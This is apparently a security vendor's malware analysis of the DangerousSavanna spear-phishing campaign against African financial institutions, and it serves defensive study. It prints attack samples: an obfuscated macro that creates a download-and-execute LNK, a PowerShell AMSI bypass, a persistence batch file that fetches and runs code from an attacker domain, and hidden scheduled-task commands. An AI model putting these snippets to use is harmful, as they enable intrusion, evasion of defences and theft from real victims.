In a quarter of these cases,\nintrusions into network systems resulted in the worst possible outcomes for the financial and\nbanking sector: information leaks, identity theft, money transfer fraud, and bank withdrawals on\nfalse checks.\n\nIn this article, we analyze a malicious campaign called DangerousSavanna which has been\ntargeting multiple major financial service groups in French-speaking Africa for the last two years.\nThe threat actors behind this campaign use spear-phishing as a means of initial infection, sending\nemails with malicious attachments to the employees of financial institutions in at least five different\nFrench-speaking countries: Ivory Coast, Morocco, Cameroon, Senegal, and Togo. In the last few\nmonths, the campaign heavily focused on Ivory Coast. Judging by the victimology and tactics,\ntechniques, and procedures (TTPs), we can assess with medium to high confidence that the\nmotivation behind DangerousSavanna is likely financial.\n\n\n-----\n\nDangerousSavanna tends to install relatively unsophisticated software tools in the infected\nenvironments. These tools are both self-written and based on open-source projects such as\n[Metasploit,](https://github.com/rapid7/metasploit-framework) [PoshC2,](https://github.com/nettitude/PoshC2) [DWservice, and](https://github.com/dwservice) [AsyncRAT. The threat actors’ creativity is on display in the](https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp)\ninitial infection stage, as they persistently pursue the employees of the targeted companies,\nconstantly changing infection chains that utilize a wide range of malicious file types, from selfwritten executable loaders and malicious documents, to ISO, LNK, JAR and VBE files in various\ncombinations. The evolving infection chains by the threat actor reflect the changes in the threat\nlandscape we’ve seen over the past few years as infection vectors became more and more\nsophisticated and diverse.\n\nThis publication provides an overview of the threat actors’ TTPs, the evolution of the infection\nchains and lures, and the infrastructure changes. We also discuss the post-infection activities\nconducted by the group after they gain initial access to the targets’ internal networks.\n\n**Figure 1 – Locations of targeted financial services employees, all in French-speaking African**\ncountries.\n\n## Infection Chains\n\nThe infection starts with spear-phishing emails written in French, usually sent to several employees\nof the targeted companies, all of which are medium to large financial groups in French-speaking\nAfrica. In the early stages of the campaign, the phishing emails were sent using Gmail and Hotmail\nservices. To increase their credibility, the actors began to use lookalike domains, impersonating\n\n\n-----\n\nother financial institutions in Africa such as the Tunisian Foreign bank, Nedbank, and others. For\nthe last year, the actors also used spoofed email addresses of a local insurance advisory company\nwhose domain doesn’t have an SPF record.\n\n**Figure 2 – An example of a phishing email in which the actors used the name of an existing**\nemployee at the impersonated company.\n\nThe type of phishing email attachments, and the subsequent infection chains, have also changed\nover the campaign time frame, from self-written executable loaders masquerading as PDFs in 2020\nto a wide range of file types in 2022. DangerousSavanna quickly joined the trend of malicious\nactors shifting from “classic” macro-enabled documents to experiment with other file types following\n[Microsoft’s decision to block macros obtained from the internet by default.](https://research.checkpoint.com/2022/the-death-of-please-enable-macros-and-what-it-means/)\n\n\n-----\n\n**Figure 3 – Overview of the changes in the DangerousSavanna infection chains, infrastructure and**\npayloads.\n\n### Malicious Documents\n\nSince 2021, the actors have been attaching malicious documents to their phishing emails. These\ndocuments are either Word documents with macros, documents with a remote template (or, in\nsome cases a few layers of external templates), or PDF documents, which lure the victim to\ndownload and then manually execute the next stage. All these documents, both MS Office or PDF,\nare written in the French language and share similar metadata such as the usernames `digger,`\n```\nhooper davis, and HooperDEV .\n\n```\n\n-----\n\n**Figure 4 – Overview of the lure documents used in the campaign.**\n\nThe basic flow utilizes Word documents with macros, which drop an LNK file in the Startup folder.\nWhen the LNK file is executed, it downloads from the server and executes PowerShell commands,\nwhich perform AMSI bypass and eventually install the PoshC2 implant.\n\n**Figure 5 – Phishing document with macro – infection flow.**\n\nThe macros contain a lot of unused code to complicate its analysis. The code for the main\nfunctionality is trivial, containing only reverse string obfuscation and caret obfuscation to create the\nLNK file used to retrieve the PoshC2 implant:\n\n\n-----\n\n```\nPrivate Function guttural(ludicrous As String)\n\n guttural = StrReverse(ludicrous)\n\nEnd Function\n\nSub automatic()\n\n  Set tearful = grandiose(guttural(\"llehS.tpircSW\"))\n\n  Dim greasy\n\n  cowardly = tearful.SpecialFolders(guttural(\"putratS\")) & guttural(\"knl.ogol/\")\n\n  Set great = tearful.CreateShortcut(cowardly)\n\n  great.IconLocation = guttural(\"oci.serutcip\\}9c2278fc2f8d-dda8-9bf4-e6cf658bed70{\\ksaT\\egatS eciveD\\tfosorciM\\ataDmargorP\\:C\")\n\n  great.WindowStyle = 7\n\n  great.TargetPath = guttural(\"ex\" & \"e.dmc\")\n\n  great.Arguments =\nguttural(\")^)'\"\"d\"\"d/t^t/m\"\"o\"\"c.ez\"\"i\"\"ig.s\"\"s\"\"erp//:p\"\"t\"\"th'(gn\"\"i\"\"rtSdao^lnw\"\"o\"\"d.)tn\n tcej^bo-\"\"w\"\"en((x\"\"e\"\"i c^- i^n^on- ss^a^py^B c^e^xE- ne^ddi^h dn^i^w- po^ne^xe.l^lehs^re^w^op c/, ex^e.d^mc\")\n\n  great.WorkingDirectory = \"C:\"\n\n  great.HotKey = Chr(69 - 4)\n\n  great.Description = \"OpenDrive\"\n\n  great.Save\n\nEnd Sub\n\n```\nDuring this campaign, we observed multiple variations of this flow:\n\nIn some cases, the similar macro drops the LNK file to Desktop instead of the Startup folder;\nthe LNK file is usually called `IMPORTANT_2022.lnk and needs an action by the user to run.`\nBoth Desktop and Startup LNK methods rely on additional actions on the infected machine\nand therefore avoid the automatic execution of suspicious PowerShell in a sandbox\nenvironment.\nThe initial attachment might be a DOCX document that downloads an external template\nexecuting a similar macro. In some cases, we’ve seen a chain of remote templates being\nretrieved before the final document with the actual macro is delivered.\nSome early versions of the macro directly run the PoshC2 PowerShell dropper and skip the\nstep with the LNK file.\nThe documents containing macros are often delivered in container files, such as ZIP and ISO\nfiles.\n\nIn addition, the actors actively use PDF files to lure the user to download and manually execute the\nnext stage. These are VBE or JAR files that perform very similar actions, directly loading the\nPoshC2 implant or dropping an LNK file to load PoshC2.\n\n### PoshC2\n\nRecently, the actors have relied mostly on PoshC2 implants to control the infected machines.\nTypically, after the initial infection launches PowerShell to download code from a Pastebin-like\nservice called paste.c-net.org or a dedicated C&C server, it replies with a PowerShell PoshC2\nimplant, usually consisting of three byte-encoded blocks (all standard modules from PoshC2). The\nfirst two PowerShell code blocks that are executed contain two very similar AMSI bypass\ntechniques:\n\n\n-----\n\n```\n$a [Ref].Assembly.GetTypes();\n\nForEach($b in $a) {\n\n  if ($b.Name -like \"*iutils\")  { $c = $b }\n\n};\n$d = $c.GetFields('NonPublic,Static');\n\nForEach($e in $d) {\n\n  if ($e.Name -like \"*itFailed\") { $f = $e }\n\n};\n$f.SetValue($null,$true)\n\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','\n\n```\nThe third block contains a backdoor which is responsible for communication with the C&C server. It\nsends requests to the server in a loop with a cookie called `SessionID with a base64-encoded`\nAES encrypted string that contains information about the victim:\n\n```\n\"$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;$procname;1\"\n\n```\n\nThe script expects the response by the C&C to be a PowerShell script as well since it passes the\nresult to the `Invoke-Expression cmdlet.`\n\n### AsyncRAT\n\nBack in October 2021, we observed a case where a malicious document from the campaign\nreached out to paste.c-net.org, but instead retrieved a PowerShell script that loads an AsyncRAT\nassembly in memory. However, this AsyncRAT build is completely unobfuscated, and in fact\ncontains a server certificate with the CN “AsyncRAT Server”, showing the attackers gave little\nthought to making any changes to the open-source tool.\n\n\n-----\n\n**Figure 6 – AsyncRAT Source Code on GitHub vs decompiled AsyncRAT (on the right)**\n\n### Older document versions\n\nThe earliest versions of the documents, dated in the first half of 2021, have different macros which\nare significantly more obfuscated and contain more than a 1MB of junk code.\n\n**Figure 7 – A part of** [Vba2graph visualization of 1.7MB macros for the May 2021 document](https://github.com/MalwareCantFly/Vba2Graph)\n(md5:a09b19b6975e090fb4eda6ced1847b1), with the only functional flow starting from\nDocument_Open.\n\nOne of these documents, called Nouvelles_Dispositions_Sanitaires.doc (New Sanitary\nProvisions.doc) uses a macro to download a PowerShell script from `4sync.com, cloud storage for`\nsyncing files between different devices, and then loads and executes in memory an assembly from\n```\nhttps://3.8.126[.]182/minom.txt . A very similar document, thoroughly detailed back in May\n\n```\n[2021 in a blog post by InQuest, also used 4sync to install what seemed to be a custom backdoor](https://inquest.net/blog/2021/05/26/pschain)\nnamed Billang. It’s a .NET executable with this PDB path:\n```\nC:\\Users\\wallstreet\\source\\repos\\Billang\\Billang\\obj\\Release\\Billang.pdb . It\n\n```\ncollects some information about the machine it’s running on, sends it to the remote server, and\nretrieves another .NET executable called `liko (or, based on the PDB path, WindowsFormsApp3).`\nAmong other features, this program injects a byte-reversed Meterpreter HTTPS shellcode to the\n```\nmspaint.exe process. Another interesting feature of this binary is that the shellcode only\n\n```\nlaunches after detecting a mouse click, perhaps as an anti-sandbox feature.\n\n\n-----\n\n**Figure 8 – Shellcode injection from WindowsFormsApp3.exe**\n(0b1d7c043be8c696d53d63fc0c834195) to mspaint.exe.\n\nSearching for more related files, we found additional executables written in C# that in a similar way\nlaunch a process such as `notepad.exe or` `mspaint.exe and inject the shellcode to them, not`\nembedded but downloaded from a C&C server, into the benign process. These simple injector\nexecutables vary little in their functionality. The difference between them is the obfuscation\nmethods: some are packed with SmartAssembly, and some contain obfuscated variable names.\nHowever, all of the shellcode payloads we observed are Meterpreter shellcode, and of those\nexecutables that contain their debug information, all reference the PDB path starting with\n```\nC:\\Users\\wallstreet\\ .\n\n### Executable droppers\n\n```\nIn the early days of the campaign, from the end of 2020 to the beginning of 2021, the actors relied\non small self-written tools in .NET instead of documents. First-stage executable droppers attached\nto the phishing emails are disguised as documents and have a PDF icon and sometimes double\nextension in the name (for example, Nouvelles Reformes 2021.pdf.exe which in English is “New\nReforms 2021.pdf.exe”). In fact, these trivial downloaders use batch scripts (or cmd commands)\nand PowerShell to retrieve the second-stage loaders from file-sharing platforms like `4sync.com or`\n\n\n-----\n\n```\nfilesend.jp and execute them. In this specific example, the dropper creates and runs a bat file\n\n```\n[which performs AMSI bypass via COM Hijacking and then uses PowerShell to download the next](https://enigma0x3.net/2017/07/)\nstage loader and save it on the disk as `WinTray.exe :`\n\n**Figure 9 – Simplified infection chain for “Nouvelles Reformes 2021.pdf.exe”**\n(7b8d0b4e718bc543de4a049e23672d79)\n\nThe second-stage executables’ purpose is to inject the final payload, the Meterpreter shellcode\nwhich is usually downloaded from the hard-coded address, to different benign Windows processes.\nThese tools are similar to those discussed by InQuest and, unless their debugging information was\nremoved, also contain PDB paths with the unique username `wallstreet .`\n\nIn late 2021, some of the infection chains started using C# executables to perform even more\nsimple actions, simply launching PowerShell to pull the next stage from a server. At the time, the\ncampaign was already using PoshC2 implants instead of Metasploit payloads, but the tools still\nhave PDB paths referring to wallstreet. (Example: `C:\\Users\\wallstreet\\source\\repos\\PDF`\n```\nDocument\\PDF Document\\obj\\Release\\PDF Document.pdb ).\n\n## Post-Infection Activities\n\n```\nWhen the initial PowerShell backdoor connected to the C&C, the attackers automatically sent AMSI\n[bypass commands and a PoshC2 implant, which then retrieves a second stage implant to add](https://github.com/nettitude/PoshC2/blob/master/resources/modules/Stage2-Core.ps1)\nadditional functionality in the PowerShell session. Next, the actors establish persistence and\n\n\n-----\n\nperform reconnaissance, while also running some commands to try and evade detection.\n\n### Evasion techniques\n\nTo evade detection, the attackers first run two additional AMSI bypass commands, even though the\nbackdoor always starts with AMSI bypass. They then inject shellcode into RuntimeBroker.exe and\n[iexpress.exe, built-in Windows binaries, using the PoshC2 Inject-Shellcode module. The injected](https://github.com/ZephrFish/PoshC2_Python/blob/master/Modules/Inject-Shellcode.ps1)\n[code is Sharpv4 shellcode which contains a DLL that patches](https://github.com/nettitude/PoshC2_Shellcode) `AmsiScanBuffer (AMSI bypass`\ntechnique) and `EtwEventWrite (Event Tracing for Windows bypass technique):`\n\n**Figure 10 – DLL from the attacker shellcode that patches AmsiScanBuffer and EtwEventWrite.**\n\n\n-----\n\n**Figure 11 – Event log showing the shellcode injection into RuntimeBroker.exe.**\n\nIt then loads the base64-encoded .NET executable containing a base64-encoded PoshC2\nPowerShell implant. This chain of events eventually allows the actors to re-establish the backdoor\nin a stealthier manner, running as a known Microsoft process.\n\n### Persistence\n\nTo set up persistence, the actors drop a batch file called `WinComp.bat to the disk. First, it`\nsearches for the process `iexpress.exe, the one that runs the injected shellcode. If the process`\nexists, the script terminates. Otherwise, it starts the PowerShell backdoor using an obfuscated\ncommand, and connects to a C2 server controlled by the attackers:\n\n\n-----\n\n```\n@echo off\n\nSETLOCAL EnableExtensions\n\nset EXE=iexpress.exe\n\nFOR /F %%x IN ('tasklist /NH /FI \"IMAGENAME eq %EXE%\"') DO IF %%x == %EXE% goto\nProcessFound\n\ngoto ProcessNotFound\n\n:ProcessFound\n\nExit\n\ngoto END\n\n:ProcessNotFound\n\ncmd cm^d.e^xe,/c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -^c\ni\"e\"x((ne\"w\"-ob^ject\nne^t.w\"e\"bcl^ient).d\"o\"wnl^oadStr\"i\"ng('ht\"\"t\"\"p://ned\"\"b\"\"ankplc.\"\"4\"\"nmn.c^om/t^t/l\"\"l\"\"')\n\ngoto END\n\n:END\n\n```\nAdditionally, the actors drop another script called `slmgr.vbs to the disk which simply executes`\n```\nWinComp.bat . To finish setting up persistence, the actors create a scheduled task to run\nslmgr.vbs every 5 minutes, and two different scheduled tasks to execute WinComp.bat every 6\n\n```\nhours. After installing the scheduled tasks, the actors add a hidden attribute on the script files to\nhide them from the user in the hope of avoiding detection:\n```\nschtasks /create /f /sc once /st 00:00 /du 9999:59 /ri 5 /tn WinSys /tr\n\"C:\\Users\\Public\\slmgr.vbs\"\n\nschtasks /create /f /sc once /st 00:00 /du 9999:59 /ri 360 /tn WinSys /tr\n\"C:\\Users\\Public\\WinComp.bat\"\n\nschtasks /create /f /sc once /st 00:00 /du 9999:59 /ri 360 /tn WinComp /tr\n\"C:\\Users\\Public\\WinComp.bat\"\n\nattrib +h WinComp.bat\n\nattrib +h slmgr.vbs\n\n### Reconnaissance\n\n```\nOver time, multiple reconnaissance commands are sent to collect additional information about the\n[infected computer and its network. This includes a command from the stage 2 PoshC2 implant to](https://github.com/nettitude/PoshC2/blob/master/resources/modules/Stage2-Core.ps1)\ngrab screenshots, simply named `Get-Screenshot . The attackers also send and execute a script`\ncalled `Get-Ipconfig (which seems to originate from Microsoft’s now-defunct TechNet Gallery,`\naccording to a comment in the script) to collect network information from the\n```\nWin32_ComputerSystem WMI class. In addition, the attackers use another open-source script\n\n```\ncalled `Get-ComputerInfo, which differs from the built-in cmdlet found in PowerShell. This script`\ncollects data from multiple WMI classes, including information about the computer hardware and\nnetworking. Another script sent by the attackers is called `Invoke-Arpscan, which uses C# to run`\nan ARP scan over all network interfaces found on the machine.\n\nFinally, the attackers attempt to create a memory dump of the `svchost.exe process, most likely`\nto extract from it the existing RDP credentials.\n\n### Additional tools\n\n\n-----\n\nAlthough the actors initially rely heavily on PoshC2 modules and extensively use its features, after\nsome time spent on the infected machine, the actors start downloading some additional payloads.\nOne payload is a legitimate remote access tool called DWService, which masquerades as an Intel\nservice. The UI-based remote access tool probably gives the attackers more freedom in their\nhands-on keyboard operation, with fewer chances of being caught.\n\nAnother interesting action the attackers perform on the infected machines is installing Windows\nSubsystem for Linux (WSL). WSL is often used by threat actors to avoid detection while running\nsome useful tools. In our case, the attackers installed in WSL an open-source penetration testing\n[tool called CrackMapExe which they use to run an SMB scan of the network.](https://github.com/Porchetta-Industries/CrackMapExec)\n\nAmong other tools related to this campaign, we found an executable named `TITAN.exe, which is`\n[an open-source anti-EDR tool known as Backstab. This tool uses the SysInternals Process](https://github.com/Yaxser/Backstab)\nExplorer driver to kill protected anti-malware processes. The tool was compiled from the path\n```\nC:\\Users\\wallstreet\\Downloads\\Programs\\Backstab-master\\x64\\Debug\\Backstab.pdb,\n\n```\nwhich tells us our `wallstreet attackers probably downloaded it directly from GitHub and`\ncompiled it in Visual Studio’s default debug configuration. Together with `TITAN.exe, we found an`\nexecutable called POPULAIRE.exe, internally called LoggerStamp\n( C:\\Users\\wallstreet\\source\\repos\\LOggerStamp\\Release\\LOggerStamp.pdb ). It’s a basic\nkeylogger that takes advantage of the `SetWindowsHookExW API to register a callback function on`\nall keystrokes, writing them to a file bluntly named `keylogger.log in the same directory as the`\nexecutable. This tool doesn’t have any C&C communication mechanism and relies on other existing\nbackdoors to send the collected data to the attackers.\n\n## Victimology\n\nDangerousSavanna targets medium or large finance-related enterprises which operate across\nmultiple African countries. The companies that belong to these financial groups provide a wide\nrange of banking products and services, and include not only banks but also insurance companies,\nmicrofinancing companies, financial holding companies, financial management companies, financial\nadvisory services, etc. Despite the relatively low complexity of their tools, we observed the signs\nthat might point out that the attackers managed to infect some of their targets. This was most likely\ndue to the actors’ persistent attempts at infiltration. If one infection chain didn’t work out, they\nchanged the attachment and the lure and tried targeting the same company again and again trying\nto find an entry point. With social engineering via spear-phishing, all it takes is one incautious click\nby an unsuspecting user.\n\n## Infrastructure\n\n\n-----\n\n**Figure 12 – Overview of the changes in infection chains, infrastructure and payloads.**\n\nThe timeline above shows the developments in the campaign infrastructure over time. In the early\n[stages, the actors relied on third-party file-sharing services, such as FileSend.jp or](https://filesend.jp/) [4sync.com. In](https://4sync.com/)\n[mid-2021, a large cluster of activity was tied solely to the Pastebin-like service paste.c-net.org,](https://paste.c-net.org/)\nwhich was used to store all kinds of attack stages, from multiple external templates to the final\n[PowerShell implants. In October 2021, the team behind paste.c-net.org did an impressive cleaning](https://forums.malwarebytes.com/topic/279947-removal-request-for-pastec-netorg/)\noperation and, likely, proactively monitored all the potentially malicious content shared using their\nservice. Since then, the campaign uses seemingly random servers and has tried out different kinds\n[of intermediate servers, including bit.ly and](https://bit.ly/) [iplogger.org redirects, lookalike domains of local](https://iplogger.org/)\nfinancial-related institutions such as `nedbank.za[.]com (masquerading as NED bank) or`\n```\npaste.inexa-group[.]com (masquerading as fintech solutions provider Inexa), or simply relying\n\n```\non short-lived free DDNS services like Dynu.\n\n## Conclusion\n\nIn this article, we analyzed a malicious email campaign targeting financial institutions in West and\nNorth Africa. This campaign, which has been running for almost two years, often changes its tools\nand methods, demonstrating the actors’ knowledge of open-source tools and penetration testing\nsoftware. We expect that this campaign, which shows no signs of stopping or slowing down, will\ncontinue to adjust its operations and methods with an eye to maximizing its financial gain.\n\n[Spear phishing
